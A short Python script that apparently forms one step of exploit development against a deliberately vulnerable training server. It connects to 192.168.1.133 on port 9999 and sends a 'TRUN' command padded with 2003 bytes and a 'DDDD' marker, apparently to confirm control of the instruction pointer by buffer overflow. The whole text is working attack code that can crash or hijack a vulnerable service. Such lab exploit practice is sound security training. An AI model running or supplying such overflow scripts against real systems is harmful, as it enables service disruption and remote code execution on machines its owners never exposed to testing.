import socket

try:
    stringToSend = "TRUN /.:/" + "C"*2003 + "DDDD"
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("192.168.1.133", 9999))
        
    #latin1 because it works appropriately with HEX
    sock.send(stringToSend.encode("latin1"))
    sock.close()
    
except Exception as e:
    print(e)
    exit()